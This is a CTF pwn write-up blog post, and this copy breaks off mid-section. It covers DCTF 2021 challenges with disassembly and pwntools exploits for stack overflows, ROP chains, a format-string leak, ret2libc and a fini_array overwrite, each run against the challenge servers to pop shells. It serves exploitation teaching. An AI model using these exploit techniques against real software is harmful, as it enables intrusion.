---
layout:     post
title:      "DCTF - 2021"
subtitle:   "Write-Up"
date:       2021-05-07
author:     "D4mianwayne"
tags:    ["pwn, ctf, __malloc_hook, rop, pwntools"]
categories: ["CTFs"]
theme: blink
img: "/img/pwned.png"
layout: "simple"

---

I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on. In the end, I manage to solve 7/8 pwn challenges and remaining one was solved by Faith, super talented guy.


<!-- more -->

### Pwn Sanity Check
This was more of a sanity check challenge for the pwn challenges, this was ridiculously easy:-

```asm
gef➤  disas main
Dump of assembler code for function main:
   0x000000000040078c <+0>:    push   rbp
   0x000000000040078d <+1>:    mov    rbp,rsp
   0x0000000000400790 <+4>:    mov    edi,0xa
   0x0000000000400795 <+9>:    mov    eax,0x0
   0x000000000040079a <+14>:    call   0x400580 <alarm@plt>
   0x000000000040079f <+19>:    mov    eax,0x0
   0x00000000004007a4 <+24>:    call   0x400730 <vuln>
   0x00000000004007a9 <+29>:    mov    eax,0x0
   0x00000000004007ae <+34>:    pop    rbp
   0x00000000004007af <+35>:    ret    
End of assembler dump.
gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x0000000000400730 <+0>:    push   rbp
   0x0000000000400731 <+1>:    mov    rbp,rsp
   0x0000000000400734 <+4>:    sub    rsp,0x40
   0x0000000000400738 <+8>:    lea    rdi,[rip+0x1d1]        # 0x400910
   0x000000000040073f <+15>:    call   0x400550 <puts@plt>
   0x0000000000400744 <+20>:    mov    rdx,QWORD PTR [rip+0x200915]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x000000000040074b <+27>:    lea    rax,[rbp-0x40]
   0x000000000040074f <+31>:    mov    esi,0x100
   0x0000000000400754 <+36>:    mov    rdi,rax
   0x0000000000400757 <+39>:    call   0x400590 <fgets@plt>
   0x000000000040075c <+44>:    cmp    DWORD PTR [rbp-0x4],0xdeadc0de
   0x0000000000400763 <+51>:    jne    0x40077d <vuln+77>
   0x0000000000400765 <+53>:    lea    rdi,[rip+0x1b4]        # 0x400920
   0x000000000040076c <+60>:    call   0x400550 <puts@plt>
   0x0000000000400771 <+65>:    mov    eax,0x0
   0x0000000000400776 <+70>:    call   0x4006f4 <shell>
   0x000000000040077b <+75>:    jmp    0x400789 <vuln+89>
   0x000000000040077d <+77>:    lea    rdi,[rip+0x1c1]        # 0x400945
   0x0000000000400784 <+84>:    call   0x400550 <puts@plt>
   0x0000000000400789 <+89>:    nop
   0x000000000040078a <+90>:    leave  
   0x000000000040078b <+91>:    ret    
```

First off the main function calls the vuln function which takes the input from the fgets, there was a buffer overflow vulnerability in the fgets call since the buffer was of size 0x40, while the size fgets takes is 0x100 making it vulnerable to stack overflow. In the vuln function it checks if the rbp - 0x4 has the value 0xdeadc0de which calls the shell function it the value turns out to be same but the shell function wasn’t spawning shell, it turns out to be troll function. Next up, there was a win function:-

```asm

Dump of assembler code for function win:
   0x0000000000400697 <+0>:    push   rbp
   0x0000000000400698 <+1>:    mov    rbp,rsp
   0x000000000040069b <+4>:    sub    rsp,0x10
   0x000000000040069f <+8>:    mov    DWORD PTR [rbp-0x4],edi
   0x00000000004006a2 <+11>:    mov    DWORD PTR [rbp-0x8],esi
   0x00000000004006a5 <+14>:    lea    rdi,[rip+0x18c]        # 0x400838
   0x00000000004006ac <+21>:    call   0x400550 <puts@plt>
   0x00000000004006b1 <+26>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x00000000004006b8 <+33>:    jne    0x4006f1 <win+90>
   0x00000000004006ba <+35>:    lea    rdi,[rip+0x1b7]        # 0x400878
   0x00000000004006c1 <+42>:    call   0x400550 <puts@plt>
   0x00000000004006c6 <+47>:    cmp    DWORD PTR [rbp-0x8],0x1337c0de
   0x00000000004006cd <+54>:    jne    0x4006f1 <win+90>
   0x00000000004006cf <+56>:    lea    rdi,[rip+0x1b7]        # 0x40088d
   0x00000000004006d6 <+63>:    call   0x400550 <puts@plt>
   0x00000000004006db <+68>:    lea    rdi,[rip+0x1bc]        # 0x40089e
   0x00000000004006e2 <+75>:    call   0x400560 <system@plt>
   0x00000000004006e7 <+80>:    mov    edi,0x0
   0x00000000004006ec <+85>:    call   0x4005a0 <exit@plt>
   0x00000000004006f1 <+90>:    nop
   0x00000000004006f2 <+91>:    leave  
   0x00000000004006f3 <+92>:    ret    
```

This function spawns a shell /bin/sh but only if the given argument to the function will be equivalent to 0xdeadbeef and 0x1337c0de respectively. In order to do so, we find the gadgets using ropper, since the binary is 64 bit, the calling convention of the 64 bit architecture says 1st argument for a function calls goes to the rdi while the second goes to rsi and so on. We find two useful gadgets here:-

```asm

0x0000000000400813: pop rdi; ret; 
0x0000000000400811: pop rsi; pop r15; ret; 

Now, we can just create a ROP chain and give the value 0xdeadbeef to the rdi and 0x1337c0de to the rsi and give any junk value to the r15 since it doesn’t matter what r15 holds, the exploit was as follows:-
py

from pwn import *

p = remote("dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io", 7480)

payload = b"A"*72
payload += p64(0x0000000000400813)
payload += p64(0xdeadbeef)
payload += p64(0x0000000000400811)
payload += p64(0x1337c0de)*2
payload += p64(0x400697)

p.recvline()
p.sendline(payload)
p.interactive()
```
Running the exploit:-

```asm

❯ python3 pwn_sanity.py
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
will this work?
you made it to win land, no free handouts this time, try harder
one down, one to go!
2/2 bro good job
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
$ 

Pinch Me
```


This challenge was also simple, loading the binary in gdb and checking the functions it contains, we can see that there’s a main function and vuln functions which are of interest:-

```asm

gef➤  disas main
Dump of assembler code for function main:
   0x00000000004011d5 <+0>:    push   rbp
   0x00000000004011d6 <+1>:    mov    rbp,rsp
   0x00000000004011d9 <+4>:    mov    edi,0xa
   0x00000000004011de <+9>:    call   0x401050 <alarm@plt>
   0x00000000004011e3 <+14>:    mov    eax,0x0
   0x00000000004011e8 <+19>:    call   0x401152 <vuln>
   0x00000000004011ed <+24>:    mov    eax,0x0
   0x00000000004011f2 <+29>:    pop    rbp
   0x00000000004011f3 <+30>:    ret    
End of assembler dump.
gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x0000000000401152 <+0>:    push   rbp
   0x0000000000401153 <+1>:    mov    rbp,rsp
   0x0000000000401156 <+4>:    sub    rsp,0x20
   0x000000000040115a <+8>:    mov    DWORD PTR [rbp-0x4],0x1234567
   0x0000000000401161 <+15>:    mov    DWORD PTR [rbp-0x8],0x89abcdef
   0x0000000000401168 <+22>:    lea    rdi,[rip+0xe99]        # 0x402008
   0x000000000040116f <+29>:    call   0x401030 <puts@plt>
   0x0000000000401174 <+34>:    lea    rdi,[rip+0xebd]        # 0x402038
   0x000000000040117b <+41>:    call   0x401030 <puts@plt>
   0x0000000000401180 <+46>:    mov    rdx,QWORD PTR [rip+0x2ec9]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x0000000000401187 <+53>:    lea    rax,[rbp-0x20]
   0x000000000040118b <+57>:    mov    esi,0x64
   0x0000000000401190 <+62>:    mov    rdi,rax
   0x0000000000401193 <+65>:    call   0x401060 <fgets@plt>
   0x0000000000401198 <+70>:    cmp    DWORD PTR [rbp-0x8],0x1337c0de
   0x000000000040119f <+77>:    jne    0x4011af <vuln+93>
   0x00000000004011a1 <+79>:    lea    rdi,[rip+0xe9f]        # 0x402047
   0x00000000004011a8 <+86>:    call   0x401040 <system@plt>
   0x00000000004011ad <+91>:    jmp    0x4011d2 <vuln+128>
   0x00000000004011af <+93>:    cmp    DWORD PTR [rbp-0x4],0x1234567
   0x00000000004011b6 <+100>:    je     0x4011c6 <vuln+116>
   0x00000000004011b8 <+102>:    lea    rdi,[rip+0xe90]        # 0x40204f
   0x00000000004011bf <+109>:    call   0x401030 <puts@plt>
   0x00000000004011c4 <+114>:    jmp    0x4011d2 <vuln+128>
   0x00000000004011c6 <+116>:    lea    rdi,[rip+0xe93]        # 0x402060
   0x00000000004011cd <+123>:    call   0x401030 <puts@plt>
   0x00000000004011d2 <+128>:    nop
   0x00000000004011d3 <+129>:    leave  
   0x00000000004011d4 <+130>:    ret    
End of assembler dump.
gef➤  
```

The vuln function has an obvious buffer overflow as same as of the Pwn Sanity only the size changed yet the vulnerability remains the same, the function checks whether the variable stored at the `rbp - 0x8` is equal to the `0x1337c0de` and if it does calls `system("/bin/sh")`, so in order to do, we know that the buffer we control the input for is stored at `rbp - 0x20` and the `rbp - 0x8` was compared to the value of `0x1337c0de`, so we can just do 0x20 - 0x8 to get the offset for the variable we need to control the input for which would be `0x20 - 0x8 = 24`, hence `24` is the offset for the comparing value, then we can just grab the flag from the server:-

```py

from pwn import *

p = remote("dctf1-chall-pinch-me.westeurope.azurecontainer.io", 7480)

payload = b"A"*24
payload += p32(0x1337c0de) # integer is 4 bytes, hence p32()

p.recvline()
p.sendline(payload)
p.interactive()

Run the exploit:-
r

❯ python3 pinch_me.py
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
Am I dreaming?
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ cat flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}$ 
[*] Interrupted
```

### Readme

This one was a very basic format string challenge, checking the vuln function:-

```asm

gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x000000000000085a <+0>:    push   rbp
   0x000000000000085b <+1>:    mov    rbp,rsp
   0x000000000000085e <+4>:    sub    rsp,0x60
   0x0000000000000862 <+8>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000086b <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000086f <+21>:    xor    eax,eax
   0x0000000000000871 <+23>:    lea    rsi,[rip+0x13c]        # 0x9b4
   0x0000000000000878 <+30>:    lea    rdi,[rip+0x137]        # 0x9b6
   0x000000000000087f <+37>:    call   0x730 <fopen@plt>
   0x0000000000000884 <+42>:    mov    QWORD PTR [rbp-0x58],rax
   0x0000000000000888 <+46>:    mov    rdx,QWORD PTR [rbp-0x58]
   0x000000000000088c <+50>:    lea    rax,[rbp-0x50]
   0x0000000000000890 <+54>:    mov    esi,0x1c
   0x0000000000000895 <+59>:    mov    rdi,rax
   0x0000000000000898 <+62>:    call   0x720 <fgets@plt>
   0x000000000000089d <+67>:    mov    rax,QWORD PTR [rbp-0x58]
   0x00000000000008a1 <+71>:    mov    rdi,rax
   0x00000000000008a4 <+74>:    call   0x6e0 <fclose@plt>
   0x00000000000008a9 <+79>:    lea    rdi,[rip+0x10f]        # 0x9bf
   0x00000000000008b0 <+86>:    call   0x6d0 <puts@plt>
   0x00000000000008b5 <+91>:    mov    rdx,QWORD PTR [rip+0x200754]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x00000000000008bc <+98>:    lea    rax,[rbp-0x30]
   0x00000000000008c0 <+102>:    mov    esi,0x1e
   0x00000000000008c5 <+107>:    mov    rdi,rax
   0x00000000000008c8 <+110>:    call   0x720 <fgets@plt>
   0x00000000000008cd <+115>:    lea    rdi,[rip+0x104]        # 0x9d8
   0x00000000000008d4 <+122>:    mov    eax,0x0
   0x00000000000008d9 <+127>:    call   0x700 <printf@plt>
   0x00000000000008de <+132>:    lea    rax,[rbp-0x30]
   0x00000000000008e2 <+136>:    mov    rdi,rax
   0x00000000000008e5 <+139>:    mov    eax,0x0
   0x00000000000008ea <+144>:    call   0x700 <printf@plt>
   0x00000000000008ef <+149>:    nop
   0x00000000000008f0 <+150>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000008f4 <+154>:    xor    rax,QWORD PTR fs:0x28
   0x00000000000008fd <+163>:    je     0x904 <vuln+170>
   0x00000000000008ff <+165>:    call   0x6f0 <__stack_chk_fail@plt>
   0x0000000000000904 <+170>:    leave  
   0x0000000000000905 <+171>:    ret    
End of assembler dump.
gef➤  
```

We can see it opens the flag.txt file via fopen and read the flag from the file and store it on the stack, then it takes he input via fgets and then print the given input via printf without any format specifier, this proposed the format string vulnerability and with that we can leak the values from the stack, since the flag is also stored on the stack, we can just as well leak it, using the following exploit, we can get flag:-

```py

from pwn import *
from binascii import unhexlify

p = remote("dctf-chall-readme.westeurope.azurecontainer.io", 7481)
p.recvline()
p.sendline("%8$lx-%9$lx-%10$lx-%11$x")
p.recvuntil("hello ")
output = p.recvline().strip().split(b"-")
flag = [unhexlify(x)[::-1] for x in output]
print(b"".join(flag)+b"}")
p.close()

Running the exploit:-
r

❯ python3 readme.py
[+] Opening connection to dctf-chall-readme.westeurope.azurecontainer.io on port 7481: Done
b'dctf{n0w_g0_r3ad_s0me_b00k5}'
[*] Closed connection to dctf-chall-readme.westeurope.azurecontainer.io port 7481
```

### Baby BOF

Baby BOF was normal return to libc attack, since the dockerfile is provided with the challenge which showed that the binary is running in the Ubuntu 20.04 container, hinting that the libc here used is LIBC 2.31, checking the vuln function:-

```asm

gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x00000000004005b7 <+0>:    push   rbp
   0x00000000004005b8 <+1>:    mov    rbp,rsp
   0x00000000004005bb <+4>:    sub    rsp,0x10
   0x00000000004005bf <+8>:    lea    rdi,[rip+0xde]        # 0x4006a4
   0x00000000004005c6 <+15>:    call   0x4004a0 <puts@plt>
   0x00000000004005cb <+20>:    mov    rdx,QWORD PTR [rip+0x200a6e]        # 0x601040 <stdin@@GLIBC_2.2.5>
   0x00000000004005d2 <+27>:    lea    rax,[rbp-0xa]
   0x00000000004005d6 <+31>:    mov    esi,0x100
   0x00000000004005db <+36>:    mov    rdi,rax
   0x00000000004005de <+39>:    call   0x4004c0 <fgets@plt>
   0x00000000004005e3 <+44>:    lea    rdi,[rip+0xcb]        # 0x4006b5
   0x00000000004005ea <+51>:    call   0x4004a0 <puts@plt>
   0x00000000004005ef <+56>:    nop
   0x00000000004005f0 <+57>:    leave  
   0x00000000004005f1 <+58>:    ret    
```
Again, the fgets function call is vulnerable here, we can see that the buffer is of size 0xa while the size acceptable was 0x100 making it vulnerable to buffer overflow.
Now, for the ret2libc part, I would recommend you to start reading here.

The process is exact same, leak the GOT address of the puts and call main again and call system("/bin/sh"):-

```py

from pwn import *

p = remote("dctf-chall-baby-bof.westeurope.azurecontainer.io", 7481)

elf = ELF("baby_bof")
libc= elf.libc

payload = b"A"*18
payload += p64(0x0000000000400683)
payload += p64(elf.got['alarm'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.recvline()
p.sendline(payload)

p.recvline()
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['alarm']
print(hex(libc.address))
payload = b"A"*18
payload += p64(0x000000000040048e)
payload += p64(0x0000000000400683)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])


p.sendline(payload)
p.interactive()
```

Running the exploit:-

```asm
❯ python3 baby_bof.py
[+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done
[*] '/home/d4mianwayne/Pwning/CTFs/dctf/baby_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
0x7f37b1589000
[*] Switching to interactive mode

plz don't rop me
i don't think this will work
$ cat flag.txt
dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}
$ 
[*] Interrupted
```

### Magic Trick

This was kind of a good challenge, well kind of, first check the security mechanisms:-

```asm

gef➤  checksec
[+] checksec for '/home/d4mianwayne/Pwning/CTFs/dctf/magic_trick'
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
gef➤  
```
Now, this shows off that that there’s Canary and NX protection while the PIE and RELRO is disabled, this means we can write the _fini_array or any of the Global Offset Table entries. The main function calls the magic function, checking it:-

```asm

gef➤  disas magic 
Dump of assembler code for function magic:
   0x000000000040068d <+0>:    push   rbp
   0x000000000040068e <+1>:    mov    rbp,rsp
   0x0000000000400691 <+4>:    sub    rsp,0x20
   0x0000000000400695 <+8>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040069e <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006a2 <+21>:    xor    eax,eax
   0x00000000004006a4 <+23>:    lea    rdi,[rip+0x15e]        # 0x400809
   0x00000000004006ab <+30>:    call   0x400520 <puts@plt>
   0x00000000004006b0 <+35>:    lea    rax,[rbp-0x20]
   0x00000000004006b4 <+39>:    mov    rsi,rax
   0x00000000004006b7 <+42>:    lea    rdi,[rip+0x165]        # 0x400823
   0x00000000004006be <+49>:    mov    eax,0x0
   0x00000000004006c3 <+54>:    call   0x400560 <__isoc99_scanf@plt>
   0x00000000004006c8 <+59>:    lea    rdi,[rip+0x159]        # 0x400828
   0x00000000004006cf <+66>:    call   0x400520 <puts@plt>
   0x00000000004006d4 <+71>:    lea    rax,[rbp-0x18]
   0x00000000004006d8 <+75>:    mov    rsi,rax
   0x00000000004006db <+78>:    lea    rdi,[rip+0x141]        # 0x400823
   0x00000000004006e2 <+85>:    mov    eax,0x0
   0x00000000004006e7 <+90>:    call   0x400560 <__isoc99_scanf@plt>
   0x00000000004006ec <+95>:    lea    rdi,[rip+0x153]        # 0x400846
   0x00000000004006f3 <+102>:    call   0x400520 <puts@plt>
   0x00000000004006f8 <+107>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004006fc <+111>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400700 <+115>:    mov    rdx,QWORD PTR [rbp-0x20]
   0x0000000000400704 <+119>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400708 <+123>:    mov    QWORD PTR [rax],rdx
   0x000000000040070b <+126>:    nop
   0x000000000040070c <+127>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400710 <+131>:    xor    rax,QWORD PTR fs:0x28
   0x0000000000400719 <+140>:    je     0x400720 <magic+147>
   0x000000000040071b <+142>:    call   0x400530 <__stack_chk_fail@plt>
   0x0000000000400720 <+147>:    leave  
   0x0000000000400721 <+148>:    ret    
```

We can see that the program calls scanf two times and take unsigned long long, first it takes a value, second input takes another input and attempt to write the value given by the first input to the address of the second input, that means it allow us to write any value to any address having r/w access to.
Since the RELRO is disabled, we can overwrite the destructors which will be run once the process will come to an end to the address of the win function which prints the flag:-

```py

from pwn import *

p = remote("dctf-chall-magic-trick.westeurope.azurecontainer.io", 7481)
elf = ELF("magic_trick")
p.recvline()
p.recvline()
p.recvline()

p.sendline(str(elf.symbols['win']))
p.recvline()
p.sendline(str(elf.symbols['__do_global_dtors_aux_fini_array_entry']))
p.interactive()

Running the exploit:-

❯ python3 magic_trick.py
[+] Opening connection to dctf-chall-magic-trick.westeurope.azurecontainer.io on port 7481: Done
[*] '/home/d4mianwayne/Pwning/CTFs/ductf/magic_trick'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
thanks
You are a real magician
dctf{1_L1k3_M4G1c}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

### Hotel ROP

This was yet another ROP challenge but kind of a twist on it, it has PIE and NX enabled but the Canary was disabled:-

```asm

gef➤  checksec
[+] checksec for '/home/d4mianwayne/Pwning/CTFs/ductf/hotel_rop'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```
Now, checking the function it contains, we can see there are several user-defined functions:-

```asm

gef➤  i functions 
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  system@plt
0x0000000000001050  printf@plt
0x0000000000001060  alarm@plt
0x0000000000001070  fgets@plt
0x0000000000001080  exit@plt
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _start
0x00000000000010d0  deregister_tm_clones
0x0000000000001100  register_tm_clones
0x0000000000001140  __do_global_dtors_aux
0x0000000000001180  frame_dummy
0x0000000000001185  loss
0x00000000000011dc  california
0x0000000000001283  silicon_valley
0x000000000000131e  vuln
0x000000000000136d  main
0x00000000000013b0  __libc_csu_init
0x0000000000001410  __libc_csu_fini
0x0000000000001414  _fini
gef➤  
```

Checking for the function named main function, we can see it prints the address of the main function, so much for the PIE security, PIE can bypassed since we get the address of the function, we can obtain the base address of the ELF itself. Then it calls the function vuln:-

```asm

gef➤  disas main
Dump of assembler code for function main:
   0x000000000000136d <+0>:    push   rbp
   0x000000000000136e <+1>:    mov    rbp,rsp
   0x0000000000001371 <+4>:    mov    edi,0xa
   0x0000000000001376 <+9>:    call   0x1060 <alarm@plt>
   0x000000000000137b <+14>:    lea    rsi,[rip+0xffffffffffffffeb]        # 0x136d <main>
   0x0000000000001382 <+21>:    lea    rdi,[rip+0xdb7]        # 0x2140
   0x0000000000001389 <+28>:    mov    eax,0x0
   0x000000000000138e <+33>:    call   0x1050 <printf@plt>
   0x0000000000001393 <+38>:    mov    eax,0x0
   0x0000000000001398 <+43>:    call   0x131e <vuln>
   0x000000000000139d <+48>:    mov    eax,0x0
   0x00000000000013a2 <+53>:    pop    rbp
   0x00000000000013a3 <+54>:    ret    
End of assembler dump.
gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x000000000000131e <+0>:    push   rbp
   0x000000000000131f <+1>:    mov    rbp,rsp
   0x0000000000001322 <+4>:    sub    rsp,0x20
   0x0000000000001326 <+8>:    lea    rdi,[rip+0xda3]        # 0x20d0
   0x000000000000132d <+15>:    call   0x1030 <puts@plt>
   0x0000000000001332 <+20>:    mov    rdx,QWORD PTR [rip+0x2d27]        # 0x4060 <stdin@@GLIBC_2.2.5>
   0x0000000000001339 <+27>:    lea    rax,[rbp-0x20]
   0x000000000000133d <+31>:    mov    esi,0x100
   0x0000000000001342 <+36>:    mov    rdi,rax
   0x0000000000001345 <+39>:    call   0x1070 <fgets@plt>
   0x000000000000134a <+44>:    cmp    DWORD PTR [rbp-0x4],0x0
   0x000000000000134e <+48>:    je     0x135e <vuln+64>
   0x0000000000001350 <+50>:    lea    rdi,[rip+0xd91]        # 0x20e8
   0x0000000000001357 <+57>:    call   0x1030 <puts@plt>
   0x000000000000135c <+62>:    jmp    0x136b <vuln+77>
   0x000000000000135e <+64>:    lea    rdi,[rip+0xdb3]        # 0x2118
   0x0000000000001365 <+71>:    call   0x1030 <puts@plt>
   0x000000000000136a <+76>:    nop
   0x000000000000136b <+77>:    leave  
   0x000000000000136c <+78>:    ret    
End of assembler dump.
```

The vuln function was calling the fgets and the given size to the fgets more than the buffer could hold, so it was a stack overflow. Secondly, there were two other functions:-

```asm

gef➤  disas california 
Dump of assembler code for function california:
   0x00000000000011dc <+0>:    push   rbp
   0x00000000000011dd <+1>:    mov    rbp,rsp
   0x00000000000011e0 <+4>:    lea    rdi,[rip+0xe72]        # 0x2059
   0x00000000000011e7 <+11>:    call   0x1030 <puts@plt>
   0x00000000000011ec <+16>:    lea    rdi,[rip+0xe85]        # 0x2078
   0x00000000000011f3 <+23>:    call   0x1030 <puts@plt>
   0x00000000000011f8 <+28>:    mov    eax,DWORD PTR [rip+0x2e7a]        # 0x4078 <len>
   0x00000000000011fe <+34>:    cdqe   
   0x0000000000001200 <+36>:    lea    rdx,[rip+0x2e69]        # 0x4070 <win_land>
   0x0000000000001207 <+43>:    mov    BYTE PTR [rax+rdx*1],0x2f
   0x000000000000120b <+47>:    mov    eax,DWORD PTR [rip+0x2e67]        # 0x4078 <len>
   0x0000000000001211 <+53>:    add    eax,0x1
   0x0000000000001214 <+56>:    mov    DWORD PTR [rip+0x2e5e],eax        # 0x4078 <len>
   0x000000000000121a <+62>:    mov    eax,DWORD PTR [rip+0x2e58]        # 0x4078 <len>
   0x0000000000001220 <+68>:    cdqe   
   0x0000000000001222 <+70>:    lea    rdx,[rip+0x2e47]        # 0x4070 <win_land>
   0x0000000000001229 <+77>:    mov    BYTE PTR [rax+rdx*1],0x62
   0x000000000000122d <+81>:    mov    eax,DWORD PTR [rip+0x2e45]        # 0x4078 <len>
   0x0000000000001233 <+87>:    add    eax,0x1
   0x0000000000001236 <+90>:    mov    DWORD PTR [rip+0x2e3c],eax        # 0x4078 <len>
   0x000000000000123c <+96>:    mov    eax,DWORD PTR [rip+0x2e36]        # 0x4078 <len>
   0x0000000000001242 <+102>:    cdqe   
   0x0000000000001244 <+104>:    lea    rdx,[rip+0x2e25]        # 0x4070 <win_land>
   0x000000000000124b <+111>:    mov    BYTE PTR [rax+rdx*1],0x69
   0x000000000000124f <+115>:    mov    eax,DWORD PTR [rip+0x2e23]        # 0x4078 <len>
   0x0000000000001255 <+121>:    add    eax,0x1
   0x0000000000001258 <+124>:    mov    DWORD PTR [rip+0x2e1a],eax        # 0x4078 <len>
   0x000000000000125e <+130>:    mov    eax,DWORD PTR [rip+0x2e14]        # 0x4078 <len>
   0x0000000000001264 <+136>:    cdqe   
   0x0000000000001266 <+138>:    lea    rdx,[rip+0x2e03]        # 0x4070 <win_land>
   0x000000000000126d <+145>:    mov    BYTE PTR [rax+rdx*1],0x6e
   0x0000000000001271 <+149>:    mov    eax,DWORD PTR [rip+0x2e01]        # 0x4078 <len>
   0x0000000000001277 <+155>:    add    eax,0x1
   0x000000000000127a <+158>:    mov    DWORD PTR [rip+0x2df8],eax        # 0x4078 <len>
   0x0000000000001280 <+164>:    nop
   0x0000000000001281 <+165>:    pop    rbp
   0x0000000000001282 <+166>:    ret    
End of assembler dump.
gef➤  disas silicon_valley 
Dump of assembler code for function silicon_valley:
   0x0000000000001283 <+0>:    push   rbp
   0x0000000000001284 <+1>:    mov    rbp,rsp
   0x0000000000001287 <+4>:    lea    rdi,[rip+0xe25]        # 0x20b3
   0x000000000000128e <+11>:    call   0x1030 <puts@plt>
   0x0000000000001293 <+16>:    mov    eax,DWORD PTR [rip+0x2ddf]        # 0x4078 <len>
   0x0000000000001299 <+22>:    cdqe   
   0x000000000000129b <+24>:    lea    rdx,[rip+0x2dce]        # 0x4070 <win_land>
   0x00000000000012a2 <+31>:    mov    BYTE PTR [rax+rdx*1],0x2f
   0x00000000000012a6 <+35>:    mov    eax,DWORD PTR [rip+0x2dcc]        # 0x4078 <len>
   0x00000000000012ac <+41>:    add    eax,0x1
   0x00000000000012af <+44>:    mov    DWORD PTR [rip+0x2dc3],eax        # 0x4078 <len>
   0x00000000000012b5 <+50>:    mov    eax,DWORD PTR [rip+0x2dbd]        # 0x4078 <len>
   0x00000000000012bb <+56>:    cdqe   
   0x00000000000012bd <+58>:    lea    rdx,[rip+0x2dac]        # 0x4070 <win_land>
   0x00000000000012c4 <+65>:    mov    BYTE PTR [rax+rdx*1],0x73
   0x00000000000012c8 <+69>:    mov    eax,DWORD PTR [rip+0x2daa]        # 0x4078 <len>
   0x00000000000012ce <+75>:    add    eax,0x1
   0x00000000000012d1 <+78>:    mov    DWORD PTR [rip+0x2da1],eax        # 0x4078 <len>
   0x00000000000012d7 <+84>:    mov    eax,DWORD PTR [rip+0x2d9b]        # 0x4078 <len>
   0x00000000000012dd <+90>:    cdqe   
   0x00000000000012df <+92>:    lea    rdx,[rip+0x2d8a]        # 0x4070 <win_land>
   0x00000000000012e6 <+99>:    mov    BYTE PTR [rax+rdx*1],0x68
   0x00000000000012ea <+103>:    mov    eax,DWORD PTR [rip+0x2d88]        # 0x4078 <len>
   0x00000000000012f0 <+109>:    add    eax,0x1
   0x00000000000012f3 <+112>:    mov    DWORD PTR [rip+0x2d7f],eax        # 0x4078 <len>
   0x00000000000012f9 <+118>:    mov    eax,DWORD PTR [rip+0x2d79]        # 0x4078 <len>
   0x00000000000012ff <+124>:    cdqe   
   0x0000000000001301 <+126>:    lea    rdx,[rip+0x2d68]        # 0x4070 <win_land>
   0x0000000000001308 <+133>:    mov    BYTE PTR [rax+rdx*1],0x0
   0x000000000000130c <+137>:    mov    eax,DWORD PTR [rip+0x2d66]        # 0x4078 <len>
   0x0000000000001312 <+143>:    add    eax,0x1
   0x0000000000001315 <+146>:    mov    DWORD PTR [rip+0x2d5d],eax        # 0x4078 <len>
   0x000000000000131b <+152>:    nop
   0x000000000000131c <+153>:    pop    rbp
   0x000000000000131d <+154>:    ret    
End of assembler dump.
gef➤  
```

The california function adds the 4 bytes to the win_land global variable, the 4 bytes were /bin and the next function named silicon_valley adds the remaining 4 bytes /sh\x00 to the win_land making the win_land equals to the /bin/shx00, then there was another function named loss, which was as following:-

```asm

gef➤  disas loss
Dump of assembler code for function loss:
   0x0000000000001185 <+0>:    push   rbp
   0x0000000000001186 <+1>:    mov    rbp,rsp
   0x0000000000001189 <+4>:    sub    rsp,0x10
   0x000000000000118d <+8>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001190 <+11>:    mov    DWORD PTR [rbp-0x8],esi
   0x0000000000001193 <+14>:    mov    edx,DWORD PTR [rbp-0x4]
   0x0000000000001196 <+17>:    mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000001199 <+20>:    add    eax,edx
   0x000000000000119b <+22>:    cmp    eax,0xdeadc0de
   0x00000000000011a0 <+27>:    jne    0x11d9 <loss+84>
   0x00000000000011a2 <+29>:    lea    rdi,[rip+0xe5f]        # 0x2008
   0x00000000000011a9 <+36>:    call   0x1030 <puts@plt>
   0x00000000000011ae <+41>:    cmp    DWORD PTR [rbp-0x4],0x1337c0de
   0x00000000000011b5 <+48>:    jne    0x11d9 <loss+84>
